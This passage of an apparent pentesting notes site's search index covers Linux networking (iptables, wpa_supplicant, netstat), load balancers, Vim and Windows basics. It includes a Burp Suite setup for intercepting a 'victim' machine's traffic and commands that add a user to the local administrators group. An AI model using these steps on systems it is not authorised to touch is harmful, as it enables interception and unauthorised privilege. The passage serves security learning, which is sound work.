-j REDIRECT --to-ports 53 Now we just have to configure burp-suite a little bit. Go to Proxy > Options > Proxy Listeners > Edit > Binding > All interfaces Go to: Proxy > Options > Proxy Listeners > Edit > Request handling > Support invisible proxy Now if you do the following from the victim machine: curl icanhazip.com You will see the request in burp suite. If you want to mitm windowsyou just need to change the ip and gateway to 192.168.15.2 and 192.168.150.1.","title":"Example - Man in the middle a host"},{"location":"basics_of_linux/basics_of_linux/#wireless-wpa95supplicant","text":"So if you manage to disable networkManager you can connect to a wireless network using wpa_supplicant instead. I think that is what NetworkManager actually uses underneith. First we need to list all Access Points. sudo iwlist wlan0 scan Then we need to create a config-file for our specific access-point. We can do that with wpa_passphrase, after running the command we are asked to write the password, which also gets stored in the config file. In plaintext. wpa_passphrase NameOfWIfi > wpa.conf Now we just connect to the AP: wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/wpa.conf After this you do not have an IP-address, or you might not have a updated dhcp lease. So first you need to release the current lease. sudo dhclient wlan0 -r # Then get a new dhcp lease sudo dhclient wlan0 Now you should be able to surf the internetz.","title":"Wireless - wpa_supplicant"},{"location":"basics_of_linux/basics_of_linux/#netstat-find-outgoing-and-incoming-connections","text":"Netstat is a multiplatform tool. So it works on both mac, windows and linux. $ netstat -antlp Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 mymachine:domain *:* LISTEN - tcp 0 0 localhost:ipp *:* LISTEN - tcp 0 0 localhost:27017 *:* LISTEN - tcp 0 0 localhost:mysql *:* LISTEN - A few interesting things to observe here is that my machine is using any port over 1024 to connect to the outside. So it is not like just because we communicate with https and connect to port 443 that we use that port on our machine. On our machine it can be any port (over 1024) and usually any port over 10000. Find out what services are listening for connection on your machine Flags -a # All -n # show numeric addresses -p # show port -t # tcp netstat -anpt To easily check out what process is using lots of bandwidth you can use nethogs. sudo apt-get install nethogs nethogs Or you can use tcpdump, or iptables. Every listening process of course has a PID, but unless you are root you can't might not see them all.","title":"Netstat - Find outgoing and incoming connections"},{"location":"basics_of_linux/basics_of_linux/#firewall-iptables","text":"Iptables is a firewall tool in linux. A firewall is basically a tool that scans incoming and/or outgoing traffic. You can add rules to the iptables to filter for certain traffic.","title":"Firewall - Iptables"},{"location":"basics_of_linux/basics_of_linux/#types-of-chains","text":"So you can filter traffic in three different ways input , forward , and output . These are called three different chains. INPUT This is for incoming connections. If someone wants to ssh into your machine. Or a web-server responds to your request. FORWARD This chain is used for traffic that is not aimed at your machine. A router for example usually just passes information on. Most connections are just passing through. As you can see this will probably not be used so much on your machine, as a normal desktop or a server doesn't router that much traffic. OUTPUT This chain is used for outgoing traffic.","title":"Types of chains"},{"location":"basics_of_linux/basics_of_linux/#active-rules","text":"To view your active rules you do iptables -L # It will output something like this Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination So as we can see the current policy is to accept all traffic in all directions. If you for some reason has been tampering with the iptables and maybe fucked up. This is how you return it to the default setting, accepting all connections iptables --policy INPUT ACCEPT iptables --policy OUTPUT ACCEPT iptables --policy FORWARD ACCEPT If you instead want to forbid all traffic you do iptables --policy INPUT DROP iptables --policy OUTPUT DROP iptables --policy FORWARD DROP Okay, so let's block out some connections. To do that we want to add/append a new rule. We want to block all connections from our enemy 192.168.1.30. # A for append, and S for source. iptables -A INPUT -s 192.168.1.30 -j DROP # Block an entire range iptables -A INPUT -s 192.168.1.0/24 -j DROP Now if we want to see our current rules we just do iptables -L And we can now see our new rule. To add line-numbers for each rule, so that you can then specify which rule you want to reset or change or something you can output the rluels with line-numbers iptables -L -v --line-numbers Remove/delete a rule To remove a rule you just do # Remove one specific rule iptables -D INPUT 2 # Remove all rules iptables -F Save your changes Your changes will only be saved and therefore in action until you restart iptables. So they will disappear every time you reboot unless you save the changes. To save the changes on ubuntu you do sudo /sbin/iptables-save","title":"Active rules"},{"location":"basics_of_linux/basics_of_linux/#measuring-bandwidth-usage","text":"There are a few different tools in hour arsenal that we can use to measure bandwidth usage. We will start with iptables. To view the input and output traffic we just list the rules with some verbosity. iptables -L -v # Stdout Chain INPUT (policy ACCEPT 6382 packets, 1900K bytes) pkts bytes target prot opt in out source destination Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 4266 packets, 578K bytes) pkts bytes target prot opt in out source destination So clean this up and reset the count we can do the following # Restar the count iptables -Z # Remove all the rules, FLUSH them iptables -F So now we just need to add our rules. A simple script for this would be #!/bin/bash iptables -F iptables -I INPUT 1 -p tcp -j ACCEPT Then check out the traffc with iptables -L -v --line-numbers","title":"Measuring bandwidth usage"},{"location":"basics_of_linux/basics_of_linux/#examples","text":"Block outgoing connections to a specific ip iptables -A OUTPUT -d 198.1.1.1 -j DROP https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules","title":"Examples"},{"location":"basics_of_linux/basics_of_linux/#troubleshooting","text":"","title":"Troubleshooting"},{"location":"basics_of_linux/basics_of_linux/#have-you-tried-turning-it-on-and-off","text":"I have had problems with the network-adapter not starting or something like that, on Ubuntu. You can try to restart the network manager if this happens: sudo service network-manager restart","title":"Have you tried turning it on and off?"},{"location":"basics_of_linux/basics_of_linux/#magical-rfkill","text":"If for some reason the wifi is blocked you can unblock it (or block it) with rfkill. $ rfkill list 0: phy0: Wireless LAN Soft blocked: no Hard blocked: no 2: hci0: Bluetooth Soft blocked: no Hard blocked: no To block or unblock the phy0 from the example above you do: # Block rfkill block 0 # Unblock rfkill unblock 0 If there is a hard block it means that there is a physical switch on you machine that you need to switch off.","title":"Magical rfkill"},{"location":"basics_of_linux/basics_of_linux/#dns","text":"Another rather messy area is DNS. The reason for this is that we have a few different players here, /etc/resolv.conf , resolvconf , dnsmasq and the dreaded NetworkManager .","title":"DNS"},{"location":"basics_of_linux/basics_of_linux/#references","text":"https://linuxjourney.com/ https://github.com/jlevy/the-art-of-command-line","title":"References"},{"location":"basics_of_linux/common_devices_and_components/","text":"Load balancer # Load balancers can performs a few different functions. But these are the more common ones. Loan balancing # Well a load balancer principally works with load balancing. It initially receives traffic and then direct that traffic onward towards different instances/server of an app. So in order to increase the amount of traffic a webserver can handle you can just add a new instance of your app, and then tell the load balancer to direct the traffic to the new server as well. Without a load balancer the way to scale up the capacity of an application would be to buy a bigger server that can handle more traffic, not a very smooth way to scale an application. The group of servers that the load balancer directs the traffic to is usually called server farm or server pool . Load balancers can be roughly divided up n those that direct traffic on Layer 4 or Layer 7. Layer 4 load balancers act upon network traffic on layer 4, like IP, TCP, UDP. Layer 7 load balancers balance the traffic based on data found in the HTTP. It could be HTTP headers, or even URL Paths, or cookie. It is common to see when you remove the Load balancing Cookie that you get different responds. It could for example be that you are authenticated on one server, but not the other. Load balancers can assure the health of a server, in order to only direct a request to a server that is up and running. Common load balancers # The most common load balancers are F5 and Nginx. Also HA Proxy Nginx can also work as a webserver or a reverse proxy. It depends on how you configure it. Reverse proxy # From many to one. Deploying a load balancer make sense when you have multiple server. Deploying a reverse proxy in front of an application can provide some really nice features. Examples of such features are: IP whitelisting/blacklisting Limiting number of connetions from each client It can also increase the performance by doing the following: - Compression (GZIP compression - which decreases the amount of data that needs to be transfered) - SSL Terminatation - terminating can be computationally expensive. So it might be beneficial to have a reverse proxy doing that, instead of the web server, which might not be specialized to do that. - Caching - By caching certain content, it will reduce the traffic to the actual web server, and generate faster responses to the client. Common reverse proxies # F5 BIG-IP, Nginx Increased security. API Gateway # API gateway is usually used in order to route request to appropriate microservices. API gateways is usually used with microservices. It has the benefit that a client (or server) only needs to talk to one API server to get some data, instead of having to talk to 20 different microservices, which might be using different protocols. One speaking XML, the other JSON, and another SOAP. API gateway works on OSI layer 7 protocols (HTTP) Webserver ---> API Gateway --> Microservice 1, 2 or 3 Configurint the API gateway therefore becomes important. Because you need to translate the webrequest to all those different microservices, which might be using different protocols, and different authentications. It performs some or all of the the following functions: - Translates protocols. Like from JSON to XML. - Aggregates data from different microservices into one response. SSL termination Authentication IP whitelisting Client rate limiting (throttling) Logging and monitoring Response caching Web application firewall GZIP compression Servicing static content What's the difference between an API gateway and a layer 7 load balancer? Well, it is not necessarily clear cut. They can act similar. Difference could be that a load balancer doesn't really translate between protocols. An API gateway often performs the same functions as a reverse proxy or a load balancer. Maybe it is good to think of an API gateway as a advanced load balancer. Common API gateways # Nginx. Nginx is really versitile, and can be used as a load balancer, reverse proxy, web server, or api gateway. In fact Nginx can act as a reverse proxy, load balancer and API gateway all at the same time. Kong, Tyk, Amassador, Amazon API gateway, HAPRoxy. Azure API Management (APIM) Biztalk is a common windows bases API gateway.","title":"Common Devices and Components"},{"location":"basics_of_linux/common_devices_and_components/#load-balancer","text":"Load balancers can performs a few different functions. But these are the more common ones.","title":"Load balancer"},{"location":"basics_of_linux/common_devices_and_components/#loan-balancing","text":"Well a load balancer principally works with load balancing. It initially receives traffic and then direct that traffic onward towards different instances/server of an app. So in order to increase the amount of traffic a webserver can handle you can just add a new instance of your app, and then tell the load balancer to direct the traffic to the new server as well. Without a load balancer the way to scale up the capacity of an application would be to buy a bigger server that can handle more traffic, not a very smooth way to scale an application. The group of servers that the load balancer directs the traffic to is usually called server farm or server pool . Load balancers can be roughly divided up n those that direct traffic on Layer 4 or Layer 7. Layer 4 load balancers act upon network traffic on layer 4, like IP, TCP, UDP. Layer 7 load balancers balance the traffic based on data found in the HTTP. It could be HTTP headers, or even URL Paths, or cookie. It is common to see when you remove the Load balancing Cookie that you get different responds. It could for example be that you are authenticated on one server, but not the other. Load balancers can assure the health of a server, in order to only direct a request to a server that is up and running.","title":"Loan balancing"},{"location":"basics_of_linux/common_devices_and_components/#common-load-balancers","text":"The most common load balancers are F5 and Nginx. Also HA Proxy Nginx can also work as a webserver or a reverse proxy. It depends on how you configure it.","title":"Common load balancers"},{"location":"basics_of_linux/common_devices_and_components/#reverse-proxy","text":"From many to one. Deploying a load balancer make sense when you have multiple server. Deploying a reverse proxy in front of an application can provide some really nice features. Examples of such features are: IP whitelisting/blacklisting Limiting number of connetions from each client It can also increase the performance by doing the following: - Compression (GZIP compression - which decreases the amount of data that needs to be transfered) - SSL Terminatation - terminating can be computationally expensive. So it might be beneficial to have a reverse proxy doing that, instead of the web server, which might not be specialized to do that. - Caching - By caching certain content, it will reduce the traffic to the actual web server, and generate faster responses to the client.","title":"Reverse proxy"},{"location":"basics_of_linux/common_devices_and_components/#common-reverse-proxies","text":"F5 BIG-IP, Nginx Increased security.","title":"Common reverse proxies"},{"location":"basics_of_linux/common_devices_and_components/#api-gateway","text":"API gateway is usually used in order to route request to appropriate microservices. API gateways is usually used with microservices. It has the benefit that a client (or server) only needs to talk to one API server to get some data, instead of having to talk to 20 different microservices, which might be using different protocols. One speaking XML, the other JSON, and another SOAP. API gateway works on OSI layer 7 protocols (HTTP) Webserver ---> API Gateway --> Microservice 1, 2 or 3 Configurint the API gateway therefore becomes important. Because you need to translate the webrequest to all those different microservices, which might be using different protocols, and different authentications. It performs some or all of the the following functions: - Translates protocols. Like from JSON to XML. - Aggregates data from different microservices into one response. SSL termination Authentication IP whitelisting Client rate limiting (throttling) Logging and monitoring Response caching Web application firewall GZIP compression Servicing static content What's the difference between an API gateway and a layer 7 load balancer? Well, it is not necessarily clear cut. They can act similar. Difference could be that a load balancer doesn't really translate between protocols. An API gateway often performs the same functions as a reverse proxy or a load balancer. Maybe it is good to think of an API gateway as a advanced load balancer.","title":"API Gateway"},{"location":"basics_of_linux/common_devices_and_components/#common-api-gateways","text":"Nginx. Nginx is really versitile, and can be used as a load balancer, reverse proxy, web server, or api gateway. In fact Nginx can act as a reverse proxy, load balancer and API gateway all at the same time. Kong, Tyk, Amassador, Amazon API gateway, HAPRoxy. Azure API Management (APIM) Biztalk is a common windows bases API gateway.","title":"Common API gateways"},{"location":"basics_of_linux/linux/","text":"Linux # Linux was first released in September 17, 1991 by Linus Torvalds. Strictly speaking Linux is just the kernel in the GNU/Linux operating system. Linux is the most installed OS in the world, that is mainly due to the fact that android use Linux as its OS. It is leading in pretty much all markets except for the desktop-market. From a infosec perspective there are two reasons we should learn Linux. The first is that the majority of all servers in the world is running on Linux. And if we want to hack those servers we of course have to understand how they work. The second reason is that the vast majority of all hacking-tools are only available on Linux. So in this chapter we are going to look at bit at some basic commands and basics of Linux. Of course your can write quite a few books about Linux, so this tiny little introduction is just way to get you started. And also, I am just a beginner myself so I am just writing stuff that I myself need to learn. Although there is only one Linux Kernel there are many Linux Distributions, that is: different versions. That is because the GNU/Linux OS is a mix of GNU software and the Linux Kernel. The GNU/Linux OS can be packaged in a million different ways, with different software preinstalled, with different configurations, with different Graphical User Interface (GUI). The fact that you can configure the OS however you like has given rise to the many different versions. These different versions are usually called distros . There are hundreds of different distros. Some common ones are: Ubuntu, Debian, Redhat, CentOS and Arch. So you probably wonder what the main differences are. Here is a list of some differences: Package management program. Speed and interval of release Desktop environment Default GUI Community Compilation of the Linux Kernel So as you can see depending on the users needs you can choose the distro that fits you best. Some people want to have bleeding-edge (the latest updates - although a bit more unstable) and others prefer stability. Some people want a distro with higher degree of security. Others want a distro with only free software, others want distros specially made for kids, or for education, or for scientists. One distro that is common among pentesters is Kali Linux. It comes preinstalled with hundreds of different pentesting-related tools. It might not be the best distro for everyday use. But for pentesting is is really convenient. Of course you could just download the programs to your non-kali distro as you go along. But it might be just an unneccesary hassle for you.","title":"Linux"},{"location":"basics_of_linux/linux/#linux","text":"Linux was first released in September 17, 1991 by Linus Torvalds. Strictly speaking Linux is just the kernel in the GNU/Linux operating system. Linux is the most installed OS in the world, that is mainly due to the fact that android use Linux as its OS. It is leading in pretty much all markets except for the desktop-market. From a infosec perspective there are two reasons we should learn Linux. The first is that the majority of all servers in the world is running on Linux. And if we want to hack those servers we of course have to understand how they work. The second reason is that the vast majority of all hacking-tools are only available on Linux. So in this chapter we are going to look at bit at some basic commands and basics of Linux. Of course your can write quite a few books about Linux, so this tiny little introduction is just way to get you started. And also, I am just a beginner myself so I am just writing stuff that I myself need to learn. Although there is only one Linux Kernel there are many Linux Distributions, that is: different versions. That is because the GNU/Linux OS is a mix of GNU software and the Linux Kernel. The GNU/Linux OS can be packaged in a million different ways, with different software preinstalled, with different configurations, with different Graphical User Interface (GUI). The fact that you can configure the OS however you like has given rise to the many different versions. These different versions are usually called distros . There are hundreds of different distros. Some common ones are: Ubuntu, Debian, Redhat, CentOS and Arch. So you probably wonder what the main differences are. Here is a list of some differences: Package management program. Speed and interval of release Desktop environment Default GUI Community Compilation of the Linux Kernel So as you can see depending on the users needs you can choose the distro that fits you best. Some people want to have bleeding-edge (the latest updates - although a bit more unstable) and others prefer stability. Some people want a distro with higher degree of security. Others want a distro with only free software, others want distros specially made for kids, or for education, or for scientists. One distro that is common among pentesters is Kali Linux. It comes preinstalled with hundreds of different pentesting-related tools. It might not be the best distro for everyday use. But for pentesting is is really convenient. Of course you could just download the programs to your non-kali distro as you go along. But it might be just an unneccesary hassle for you.","title":"Linux"},{"location":"basics_of_linux/vim/","text":"Vim # http://www.viemu.com/a-why-vi-vim.html And also this classic answer: https://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim Core concepts # In vim you have the concept of buffers. # List buffers :buffers # Switch buffer # By number b1 b2 # By name b [name] # Close/delete a buffer :bdelete :bd Movement - Motion commands # Left,up,down,right hjkl start of line 0 (zero) end of line $ beginning of next word w beginning of next word, defined by white space W end of the next word e end of the next word, defined by white space E back to the beginning of previous word b back to the end of previous word B go to next character of your choice If you want to go to the next comma f, start of file gg end of file G Operators # Operators are commands that do things. Like delete, change or copy. c - change ce - change until end of the word. c$ - change until end of line. Combining Motions and Operators # Now that you know some motion commands and operator commands. You can start combining them. dw - delete word d$ - delete to the end of the line Count - Numbers # You can add numbers before motion commands. To move faster. 4w - move cursor three words forward 0 - move curso to the start of the line You can use numbers to perform operations. d3w - delete three words 3dd - delete three lines Replace # If you need to replace a character, there is no need to enter insert-mode. You can just use replace Go to a character and the press r followed by the character you want instead. rp if you want to replace p. R Clipboard # In order to copy something FROM vim to the OS-clipboard you can do this: The \" means that we are not entering a registry. And the * means the OS-clipboard. So we are yanking something and putting it in the OS-clipboard registry. \"*y Substitute - Search and replace # :s/thee/the/g Entering insert-mode # i - current character o - next line O - line before a - end of word A - end of line .vimrc # Here is all your vim-configuration. Plugins # Install vundle here https://github.com/VundleVim/Vundle.vim Add plugin Add plugin to your .vimrc-file and then open vim and write :PluginInstall","title":"Vim"},{"location":"basics_of_linux/vim/#vim","text":"http://www.viemu.com/a-why-vi-vim.html And also this classic answer: https://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim","title":"Vim"},{"location":"basics_of_linux/vim/#core-concepts","text":"In vim you have the concept of buffers. # List buffers :buffers # Switch buffer # By number b1 b2 # By name b [name] # Close/delete a buffer :bdelete :bd","title":"Core concepts"},{"location":"basics_of_linux/vim/#movement-motion-commands","text":"Left,up,down,right hjkl start of line 0 (zero) end of line $ beginning of next word w beginning of next word, defined by white space W end of the next word e end of the next word, defined by white space E back to the beginning of previous word b back to the end of previous word B go to next character of your choice If you want to go to the next comma f, start of file gg end of file G","title":"Movement - Motion commands"},{"location":"basics_of_linux/vim/#operators","text":"Operators are commands that do things. Like delete, change or copy. c - change ce - change until end of the word. c$ - change until end of line.","title":"Operators"},{"location":"basics_of_linux/vim/#combining-motions-and-operators","text":"Now that you know some motion commands and operator commands. You can start combining them. dw - delete word d$ - delete to the end of the line","title":"Combining Motions and Operators"},{"location":"basics_of_linux/vim/#count-numbers","text":"You can add numbers before motion commands. To move faster. 4w - move cursor three words forward 0 - move curso to the start of the line You can use numbers to perform operations. d3w - delete three words 3dd - delete three lines","title":"Count - Numbers"},{"location":"basics_of_linux/vim/#replace","text":"If you need to replace a character, there is no need to enter insert-mode. You can just use replace Go to a character and the press r followed by the character you want instead. rp if you want to replace p. R","title":"Replace"},{"location":"basics_of_linux/vim/#clipboard","text":"In order to copy something FROM vim to the OS-clipboard you can do this: The \" means that we are not entering a registry. And the * means the OS-clipboard. So we are yanking something and putting it in the OS-clipboard registry. \"*y","title":"Clipboard"},{"location":"basics_of_linux/vim/#substitute-search-and-replace","text":":s/thee/the/g","title":"Substitute - Search and replace"},{"location":"basics_of_linux/vim/#entering-insert-mode","text":"i - current character o - next line O - line before a - end of word A - end of line","title":"Entering insert-mode"},{"location":"basics_of_linux/vim/#vimrc","text":"Here is all your vim-configuration.","title":".vimrc"},{"location":"basics_of_linux/vim/#plugins","text":"Install vundle here https://github.com/VundleVim/Vundle.vim Add plugin Add plugin to your .vimrc-file and then open vim and write :PluginInstall","title":"Plugins"},{"location":"basics_of_windows/basics_of_windows/","text":"Basics of windows # Versions of Windows # Due to Windows irregular way of naming their operating systems it can be a bit hard to keep track on. So here is a list of the desktop OS, and then a list of Servers. Windows desktops OS Operating System Version Number Windows 1.0 1.04 Windows 2.0 2.11 Windows 3.0 3 Windows NT 3.1 3.10.528 Windows for Workgroups 3.11 3.11 Windows NT Workstation 3.5 3.5.807 Windows NT Workstation 3.51 3.51.1057 Windows 95 4.0.950 Windows NT Workstation 4.0 4.0.1381 Windows 98 4.1.1998 Windows 98 Second Edition 4.1.2222 Windows Me 4.90.3000 Windows 2000 Professional 5.0.2195 Windows XP 5.1.2600 Windows Vista 6.0.6000 Windows 7 6.1.7600 Windows 8.1 6.3.9600 Windows 10 10.0.10240 Windows Server Windows NT 3.51 NT 3.51 Windows NT 3.5 NT 3.50 Windows NT 3.1 NT 3.10 Windows 2000 NT 5.0 Windows 2000 Server Windows 2000 Advanced Server Windows 2000 Datacenter Server Windows NT 4.0 NT 4.0 Windows NT 4.0 Server Windows NT 4.0 Server Enterprise Windows NT 4.0 Terminal Server Edition Windows Server 2003 NT 5.2 Windows Small Business Server 2003 Windows Server 2003 Web Edition Windows Server 2003 Standard Edition Windows Server 2003 Enterprise Edition Windows Server 2003 Datacenter Edition Windows Storage Server Windows Server 2003 R2 NT 5.2 Windows Small Business Server 2003 R2 Windows Server 2003 R2 Web Edition Windows Server 2003 R2 Standard Edition Windows Server 2003 R2 Enterprise Edition Windows Server 2003 R2 Datacenter Edition Windows Compute Cluster Server 2003 (CCS) Windows Storage Server Windows Home Server Windows Server 2008 NT 6.0 Windows Server 2008 Standard Windows Server 2008 Enterprise Windows Server 2008 Datacenter Windows Server 2008 for Itanium-based Systems Windows Server Foundation 2008 Windows Essential Business Server 2008 Windows HPC Server 2008 Windows Small Business Server 2008 Windows Storage Server 2008 Windows Web Server 2008 Windows Server 2008 R2 NT 6.1 Windows Server 2008 R2 Foundation Windows Server 2008 R2 Standard Windows Server 2008 R2 Enterprise Windows Server 2008 R2 Datacenter Windows Server 2008 R2 for Itanium-based Systems Windows Web Server 2008 R2 Windows Storage Server 2008 R2 Windows HPC Server 2008 R2 Windows Small Business Server 2011 Windows MultiPoint Server 2011 Windows Home Server 2011 Windows MultiPoint Server 2010 Windows Server 2012 NT 6.2 Windows Server 2012 Foundation Windows Server 2012 Essentials Windows Server 2012 Standard Windows Server 2012 Datacenter Windows MultiPoint Server 2012 Windows Server 2012 R2 NT 6.3 Windows Server 2012 R2 Foundation Windows Server 2012 R2 Essentials Windows Server 2012 R2 Standard Windows Server 2012 R2 Datacenter Windows Server 2016 2016 NT 10.0 Windows Networks # There are mainly two ways to structure a Windows network. One is using a server-client model called Domain and the other is through a peer-to-peer like model called Worksgroup . Windows domain # On Windows domain all users are connected to a domain controller. So when you log in to your machine it authenticates against the domain controller. This way it is ultimately the domain controller that decides security policy. Length of password, how often it should be changed, disabling accounts. If a users quits his/hers job you can just remove his/her account. The person in control over the domain controller is in control of the network. As a pentester you are most likely very interesting in gaining access the the domain controller with Administrator-privileges. That means you control the network. Since you authenticate against a domain controller you can log in to your account from any of the machines in the network. Think of systems you have had in schools and universities, where you can just sit down by any computer and log in to your account. This is usually a domain type network. In order to set up a Domain network you need at least one Windows server for the domain controller. If you have hacked a machine and you want to know if it is part of either a Workgroup or a domain you can do the following: go to Control panel/System . If it says Workgroup: something it means that the machine is connected to a workgroup, and not a domain. Active directory # From Windows 2000 and on the application Active directory has been program used for maintaining the central database of users and configurations. Domain controller # Any windows computer can be configured to be a domain controller. The domain controller manages all the security aspects of the interaction between user and domain. There are usually a least two computers configured to be domain-controllers. In case one breaks down. If you have compromised a machine that belong to a domain you can check if it has any users. DC:s don't have local users. If you run enum4linux you can look out for this section Nbtstat Information <1c> - <GROUP> B <ACTIVE> Domain Controllers A third way is to run this command echo %logonserver% SMB # On networks that are based on Linux and you need to integrate a windows machine you can use SMB to do that. Kerberos # Kerberos is a network authentication protocol. The original protocol is used by many unix-systems. Windows have their own version of the Kerberos protocol, so that it works with their NT-kernel. It is used by windows Domains to authenticate users. But kerberos can also be found in several unix-operating systems. Kerberos was not built by windows, but long before. I think a machine that has port 88 open (the default kerberos port) can be assumed to be a Domain Controller. When a user logs in to the domain Active Directory uses Kerberos to authenticate the user. When the user insert her password it gets one-way encrypted and sent with Kerberos to the Active directory, which then compares it with its password database. The Key Distribution Center responds with a TGI ticket to the user machine. Workgroup # A workgroup architecture stands in contrast to the domain-system. A workgroup is based on the idea of peer-to-peer and not server-client as domain is. In a domain network you have a server (domain controller) and a client (the user). Therefore it might be a bit hard to control a network bigger than a dozen clients. So it is usually used for smaller networks. If a computer is part of a workgroup it cannot be part of a domain. In a workgroup architecture each computer is in charge of its own security settings. So there is no single computer in charge of all the security settings for the workgroup. This is good because you don't have one single point of failure, bt is also bad because you have to trust the users to configure their machines securely. In a network you can have several workgroups. But that is usually not the case. In a workgroup users can see each other, and share files. User privileges # How does the user-system work on windows. System (user) # System is actually not a user per se. System is technically a security principle. One big difference between System and Administrator is that is the computer is connected to a domain the system user can access the domain in the context of the domain account. The administrator cannot. On windows it is possible to grant permission of a file to System but not to Administrator. One example of this is the SAM key, which contains local account information. The System user has access to this information, but the Administrator does not. http://superuser.com/questions/504136/root-vs-administrator-vs-system Administrator # Administrator is a default account on Windows. It is the user with the highest privileges. Normal user # The normal user obviously have less privileges than the Administrator. You can add a new user through the cmd with the following command: net user username /add net user kalle secret_password123 /add # Add user to administrator group - thus making it administrator net localgroup administrators kalle /add # Add to Remote Desktop User https://www.windows-commandline.com/add-user-to-group-from-command-line/ Structure of windows # https://en.wikipedia.org/wiki/Directory_structure Windows 7 # The root folder of windows c:\\ by default contains the following Windows Users Registry # You often hear talk about the registry when talking about Windows. But what is really the registry? Well the windows registry is a hierarchical database that stores low-level settings used by the OS or any other application that uses it. The SAM (Security account manager) uses it, along with a lot of other stuff. There is not really any equivalent for the Registry in Linux. Most configurations are done in text-files in Linux.You can usually find the under /etc . Edit the registry # In Linux you usually just sudo-edit a config-file in /etc . In Windows you open Regedit and you can see the whole hierarchy. The registry is built with Key-value pairs. SAM # Drivers # You hear a lot of talk about drivers in the Windows ecosystem, but not in Linux. That is because in Linux the drivers are open-sourced and included in the kernel, for most part. These drivers might be produced by nice programmers or they could be developed by the hardware-producer themselves. That's why it is so easy and fast to install new hardware on Linux. If it is compatible that is. Drivers are software lets the OS communicate with the hardware. Like networks cards, graphics card, printers. To list all the drivers on the machine use the following command: driverquery This can we good to know since drivers can contains vulnerabilities that can be used for priv-esc. Check out the chapter on that. IIS - Windows web server # IIS stands for Internet Information Services (before it was Internet Information Server). The software is usually includede in most Windows versions, except for the home editions. The IIS version usually corresponds to the OS version. There is a new IIS version for every new OS, in general. By default IIS 5.1 and earlier run websites in a single process running the context of the System account ASP # Activ server pages is the scripting environment for IIS. ASP render the content on the server side. The scripting languages that are supported are: VBScript, JScript and PerlScript. Important files and stuff # SAM key File types # In windows file-ending are important. BAT # .bat -files are the windows equivalent to bash-scripts In order to write a batch-script you open up an editor and then just write your commands. And then you save it as blabla.bat. And make sure you don't save it as a text file. Then you just run the script from the cmd DLL - Dynamic Link Library # A DLL file is a library that is used for one or more program. It is a binary-file but it is not executable in itself, but it contains code that the executable calls. It is used to modularize the code of a program. In the windows operating system DLL files are shared among different applications. For example, the dll Comdlg32 is used to create dialog boxes. So different applications can invoke this library to easily create a dialog box. This promotes code reuse. So an application may use the standard windows DLL-files, but it may also bring its own DLL-files. So if one DLL-file is missing for a program a certain module might not work. As most Windows-users have sometime experienced. LIB # Lib is a bit like DLL, it is a library. But it is not dynamic as DLL. So lib-files are linked on compile-time. While dll-files are linked in run-time. Since lib-files are compiled into the executable you never see it (unless you are developing of course). But since DLL-files are dynamically loaded at run-time they are still around for the user to see. References # http://compudyne.net/post08152012/ http://www.r00tsec.com/2012/11/howto-manual-pentest-windows-cheatsheet.html","title":"Basics of Windows"},{"location":"basics_of_windows/basics_of_windows/#basics-of-windows","text":"","title":"Basics of windows"},{"location":"basics_of_windows/basics_of_windows/#versions-of-windows","text":"Due to Windows irregular way of naming their operating systems it can be a bit hard to keep track on. So here is a list of the desktop OS, and then a list of Servers. Windows desktops OS Operating System Version Number Windows 1.0 1.04 Windows 2.0 2.11 Windows 3.0 3 Windows NT 3.1 3.10.528 Windows for Workgroups 3.11 3.11 Windows NT Workstation 3.5 3.5.807 Windows NT Workstation 3.51 3.51.1057 Windows 95 4.0.950 Windows NT Workstation 4.0 4.0.1381 Windows 98 4.1.1998 Windows 98 Second Edition 4.1.2222 Windows Me 4.90.3000 Windows 2000 Professional 5.0.2195 Windows XP 5.1.2600 Windows Vista 6.0.6000 Windows 7 6.1.7600 Windows 8.1 6.3.9600 Windows 10 10.0.10240 Windows Server Windows NT 3.51 NT 3.51 Windows NT 3.5 NT 3.50 Windows NT 3.1 NT 3.10 Windows 2000 NT 5.0 Windows 2000 Server Windows 2000 Advanced Server Windows 2000 Datacenter Server Windows NT 4.0 NT 4.0 Windows NT 4.0 Server Windows NT 4.0 Server Enterprise Windows NT 4.0 Terminal Server Edition Windows Server 2003 NT 5.2 Windows Small Business Server 2003 Windows Server 2003 Web Edition Windows Server 2003 Standard Edition Windows Server 2003 Enterprise Edition Windows Server 2003 Datacenter Edition Windows Storage Server Windows Server 2003 R2 NT 5.2 Windows Small Business Server 2003 R2 Windows Server 2003 R2 Web Edition Windows Server 2003 R2 Standard Edition Windows Server 2003 R2 Enterprise Edition Windows Server 2003 R2 Datacenter Edition Windows Compute Cluster Server 2003 (CCS) Windows Storage Server Windows Home Server Windows Server 2008 NT 6.0 Windows Server 2008 Standard Windows Server 2008 Enterprise Windows Server 2008 Datacenter Windows Server 2008 for Itanium-based Systems Windows Server Foundation 2008 Windows Essential Business Server 2008 Windows HPC Server 2008 Windows Small Business Server 2008 Windows Storage Server 2008 Windows Web Server 2008 Windows Server 2008 R2 NT 6.1 Windows Server 2008 R2 Foundation Windows Server 2008 R2 Standard Windows Server 2008 R2 Enterprise Windows Server 2008 R2 Datacenter Windows Server 2008 R2 for Itanium-based Systems Windows Web Server 2008 R2 Windows Storage Server 2008 R2 Windows HPC Server 2008 R2 Windows Small Business Server 2011 Windows MultiPoint Server 2011 Windows Home Server 2011 Windows MultiPoint Server 2010 Windows Server 2012 NT 6.2 Windows Server 2012 Foundation Windows Server 2012 Essentials Windows Server 2012 Standard Windows Server 2012 Datacenter Windows MultiPoint Server 2012 Windows Server 2012 R2 NT 6.3 Windows Server 2012 R2 Foundation Windows Server 2012 R2 Essentials Windows Server 2012 R2 Standard Windows Server 2012 R2 Datacenter Windows Server 2016 2016 NT 10.0","title":"Versions of Windows"},{"location":"basics_of_windows/basics_of_windows/#windows-networks","text":"There are mainly two ways to structure a Windows network. One is using a server-client model called Domain and the other is through a peer-to-peer like model called Worksgroup .","title":"Windows Networks"},{"location":"basics_of_windows/basics_of_windows/#windows-domain","text":"On Windows domain all users are connected to a domain controller. So when you log in to your 